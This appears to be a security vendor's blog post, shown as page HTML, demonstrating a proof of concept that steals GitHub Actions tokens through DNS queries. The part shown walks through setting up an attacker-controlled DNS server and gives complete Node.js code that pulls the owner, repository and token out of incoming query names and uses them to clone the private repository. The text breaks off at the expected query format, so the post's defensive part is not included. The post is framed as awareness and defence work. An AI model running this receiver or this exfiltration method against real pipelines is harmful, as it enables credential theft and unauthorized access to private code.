<!DOCTYPE html><html lang="en"><head><meta charSet="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>Exploiting DNS Exfiltration in Github Actions - Bullfrog Security</title><meta name="description" content="This article demonstrates a proof-of-concept for cloning private GitHub repositories using DNS exfiltration, and how to protect against it using Bullfrog."/><link rel="stylesheet" href="/assets/root-aha99t8L.css"/><link rel="icon" href="/favicon.svg" type="image/svg+xml"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/></head><body><div class="min-h-screen bg-white flex flex-col"><nav class="fixed top-0 left-0 right-0 bg-white/95 backdrop-blur-sm border-b border-gray-200 z-50"><div class="max-w-7xl mx-auto px-4 md:px-8 py-4"><div class="flex items-center justify-between"><a class="flex items-center gap-3" href="/" data-discover="true"><div class="w-10 h-10 bg-emerald-500 rounded-lg flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-6 h-6 text-white"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg></div><div><h1 class="text-xl">Bullfrog Security</h1><p class="text-xs text-gray-600">CI/CD Protection</p></div></a><div class="hidden md:flex items-center gap-8"><a class="text-gray-700 hover:text-emerald-600 transition-colors" href="/#features" data-discover="true">Features</a><a class="text-gray-700 hover:text-emerald-600 transition-colors" href="/#how-it-works" data-discover="true">How It Works</a><a class="text-gray-700 hover:text-emerald-600 transition-colors" href="/#pricing" data-discover="true">Pricing</a><a class="text-gray-700 hover:text-emerald-600 transition-colors" href="/faq" data-discover="true">FAQ</a><a class="px-6 py-2 bg-emerald-500 text-white rounded-lg hover:bg-emerald-600 transition-colors" href="/#get-started" data-discover="true">Get Started</a></div><button class="md:hidden p-2 text-gray-700 hover:text-emerald-600 transition-colors" aria-label="Toggle menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu w-6 h-6"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button></div></div></nav><main class="flex-grow max-w-4xl mx-auto px-4 md:px-8 py-8 md:py-12 pt-24 md:pt-32 w-full"><a class="inline-flex items-center gap-2 text-emerald-600 hover:text-emerald-700 mb-8" href="/blog" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left w-4 h-4"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg><span>Back to Blog</span></a><article class="max-w-none"><h1 class="text-4xl md:text-5xl font-bold text-gray-900 mb-6">Exploiting DNS Exfiltration in Github Actions</h1><div class="text-gray-600 text-base mb-12"><time dateTime="2024-07-01">July 1, 2024</time><span class="mr-2 ml-2">â€¢</span><a href="https://github.com/fallard84" target="_blank" rel="noopener noreferrer" class="text-emerald-600 hover:text-emerald-700">fallard84</a></div><p class="text-lg text-gray-700 leading-relaxed mb-8">This article demonstrates a proof-of-concept for cloning private GitHub repositories using DNS exfiltration, highlighting a potential security risk within GitHub Actions workflows.</p><div class="bg-yellow-50 border-l-4 border-yellow-400 p-6"><h3 class="text-xl font-semibold text-yellow-800 mt-0 mb-3">Disclaimer</h3><p class="text-base text-yellow-700 mb-0 leading-relaxed">The information provided in this article is intended solely for educational purposes and to raise awareness about potential security vulnerabilities. The techniques demonstrated here, including DNS exfiltration in a GitHub Actions workflow, are meant to help developers and security professionals understand and defend against such threats. Unauthorized hacking, data exfiltration, and any form of cyberattack are illegal and unethical. Always use your knowledge responsibly and adhere to all applicable laws and regulations. The author and publisher of this article do not condone or encourage any malicious activity and are not responsible for any misuse of the information presented.</p></div><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">Understanding DNS Exfiltration</h2><p class="text-lg text-gray-700 leading-relaxed mb-6">Before jumping into the proof-of-concept, let&#x27;s break down what DNS exfiltration is and why it&#x27;s a threat. DNS (Domain Name System) is like the phonebook of the internet, translating domain names into IP addresses so that browsers and other clients using the internet can load the right resources. However, this system can be exploited to sneak data out of a network without detection.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">In a DNS exfiltration attack, sensitive information is encoded into DNS queries sent to a malicious DNS server. Since DNS traffic is usually allowed to pass through firewalls without much scrutiny, it&#x27;s an effective way for attackers to extract data from a secure environment. The malicious DNS server then decodes the information embedded in these queries, gaining access to the sensitive data.</p><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">High-Level Overview of the Proof-of-concept Attack</h2><p class="text-lg text-gray-700 leading-relaxed mb-6">In this proof-of-concept attack, we exploit a vulnerability in GitHub Actions workflows to exfiltrate sensitive information, specifically GitHub tokens, using DNS queries. Here&#x27;s a simplified breakdown of how it works:</p><div class="space-y-6 my-8"><div><h3 class="text-2xl font-semibold text-gray-900 mb-3">1. Compromised Workflow</h3><p class="text-lg text-gray-700 leading-relaxed">The attack begins with a compromised GitHub Actions workflow. This can be due to malicious code in a third-party action or a script within the workflow itself.</p></div><div><h3 class="text-2xl font-semibold text-gray-900 mb-3">2. Exfiltration via DNS</h3><p class="text-lg text-gray-700 leading-relaxed">The compromised workflow makes a DNS query to a specially crafted domain. This domain includes the sensitive GitHub token embedded within it.</p></div><div><h3 class="text-2xl font-semibold text-gray-900 mb-3">3. Malicious DNS Server</h3><p class="text-lg text-gray-700 leading-relaxed">A malicious DNS server, set up by the attacker, receives the DNS query. The server extracts the token from the query.</p></div><div><h3 class="text-2xl font-semibold text-gray-900 mb-3">4. Repository Cloning</h3><p class="text-lg text-gray-700 leading-relaxed">Using the extracted token, the malicious server clones the private GitHub repository, granting the attacker unauthorized access to its contents.</p></div><div><h3 class="text-2xl font-semibold text-gray-900 mb-3">5. Stealth and Evasion</h3><p class="text-lg text-gray-700 leading-relaxed">Because DNS queries are typically trusted and not closely monitored, this method of data exfiltration often evades traditional security measures, making it a stealthy and effective attack vector.</p></div></div><p class="text-lg text-gray-700 leading-relaxed mb-6">Let&#x27;s now dive into the proof-of-concept!</p><h2 class="text-3xl font-bold text-gray-900 mt-12 mb-6">Setup the DNS server</h2><h3 class="text-2xl font-semibold text-gray-900 mt-8 mb-4">Get a server that can be accessed publicly</h3><p class="text-lg text-gray-700 leading-relaxed mb-6">We recommend that you use an ephemeral VM for this, as we will modify the local DNS resolver and this could mess up with your server&#x27;s ability to resolve IP addresses and access local or remote services if not correctly configured.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">For this POC we are using an AWS EC2 instance using Ubuntu. After launching your Ubuntu instance, SSH into it and install a few software that we need to run our DNS server.</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">sudo</span><span> </span><span class="token" style="color:#dcdcaa">apt-get</span><span> update </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> </span><span class="token" style="color:#d4d4d4">\</span><span>
</span><span></span><span class="token" style="color:#dcdcaa">sudo</span><span> </span><span class="token" style="color:#dcdcaa">apt-get</span><span> </span><span class="token" style="color:#dcdcaa">install</span><span> </span><span class="token" style="color:#9cdcfe">-y</span><span> dnsmasq nodejs </span><span class="token" style="color:#dcdcaa">npm</span><span> net-tools </span><span class="token" style="color:#dcdcaa">git</span></code></pre><h3 class="text-2xl font-semibold text-gray-900 mt-8 mb-4">Create a custom DNS server</h3><p class="text-lg text-gray-700 leading-relaxed mb-6">We&#x27;ll use nodejs to create a custom DNS server which will extract the Github Token from the DNS query.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">First setup the project folder and install<!-- --> <a href="https://www.npmjs.com/package/native-dns" target="_blank" rel="noopener noreferrer" class="text-emerald-600 hover:text-emerald-700 underline">native-dns</a>:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">mkdir</span><span> dnsx
</span><span></span><span class="token" style="color:#4ec9b0">cd</span><span> dnsx
</span><span></span><span class="token" style="color:#dcdcaa">npm</span><span> init </span><span class="token" style="color:#9cdcfe">-y</span><span>
</span><span></span><span class="token" style="color:#dcdcaa">npm</span><span> </span><span class="token" style="color:#dcdcaa">install</span><span> native-dns</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Now create a file named<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">dns.js</code> with the content below:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-javascript" style="white-space:pre;color:#9cdcfe;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#569CD6">const</span><span> dns </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;native-dns&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">const</span><span> server </span><span class="token" style="color:#d4d4d4">=</span><span> dns</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">createServer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">const</span><span> util </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;node:util&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> </span><span class="token literal-property" style="color:#9cdcfe">exec</span><span class="token" style="color:#d4d4d4">:</span><span> execCb </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;node:child_process&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">const</span><span> exec </span><span class="token" style="color:#d4d4d4">=</span><span> util</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">promisify</span><span class="token" style="color:#d4d4d4">(</span><span>execCb</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">dnsResponse</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#c586c0">return</span><span> dns</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">A</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    name</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">address</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&quot;10.0.0.1&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#6a9955">//this IP address is non-consequential, it could be anything</span><span>
</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">ttl</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">60</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>server</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">on</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;request&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">request</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> response</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  request</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">question</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">forEach</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">question</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;DNS Question:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> question</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>question</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">name</span><span> </span><span class="token" style="color:#d4d4d4">===</span><span> </span><span class="token" style="color:#ce9178">&quot;test.dnsx.github.com&quot;</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      response</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">answer</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">push</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">dnsResponse</span><span class="token" style="color:#d4d4d4">(</span><span>question</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">name</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      response</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">send</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#c586c0">return</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">const</span><span> </span><span class="token" style="color:#d4d4d4">[</span><span>owner</span><span class="token" style="color:#d4d4d4">,</span><span> repo</span><span class="token" style="color:#d4d4d4">,</span><span> token</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> question</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">name</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">split</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;.&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">slice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>token </span><span class="token" style="color:#d4d4d4">||</span><span> </span><span class="token" style="color:#d4d4d4">!</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#ce9178">&quot;ghs&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;ghp&quot;</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">includes</span><span class="token" style="color:#d4d4d4">(</span><span>token</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">slice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">error</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Invalid token:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> token</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      response</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">answer</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">push</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">dnsResponse</span><span class="token" style="color:#d4d4d4">(</span><span>question</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">name</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      response</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">send</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#c586c0">return</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    fullRepo </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">owner</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178">/</span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">repo</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">Repo: </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">fullRepo</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178">, Token: </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">exec</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">git clone https://thanks:</span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">token</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178">@github.com/</span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">fullRepo</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178">.git</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#c586c0">catch</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">err</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">error</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Error:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> err</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    response</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">answer</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">push</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">dnsResponse</span><span class="token" style="color:#d4d4d4">(</span><span>question</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">name</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    response</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">send</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>server</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">on</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;error&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">err</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">error</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Server error:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> err</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;serving on 5353&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>server</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">serve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">5353</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">Now run the server:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">node</span><span> dns.js</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">You should now see<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">serving on 5353</code> <!-- -->in your console. You can test that your DNS server is responding to DNS queries using dig:</p><pre style="color:#d4d4d4;font-size:0.875rem;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e;border-radius:0.5rem;margin-bottom:2rem"><code class="language-bash" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#dcdcaa">dig</span><span> @127.0.0.1 </span><span class="token" style="color:#9cdcfe">-p</span><span> </span><span class="token" style="color:#b5cea8">5353</span><span> test.dnsx.github.com</span></code></pre><p class="text-lg text-gray-700 leading-relaxed mb-6">The DNS response should be an A record with IP 10.0.0.1.</p><p class="text-lg text-gray-700 leading-relaxed mb-6">If you look closely at the code from the custom nodejs DNS server, you can notice that we&#x27;re expecting to receive DNS queries with the following format<!-- --> <code class="bg-gray-100 px-2 py-1 rounded">&lt;GITHUB_OWNER&gt;.&lt;GITHUB_REPO&gt;.&lt;GITHUB_TOKEN&gt;.dnsx.github.com</code>. 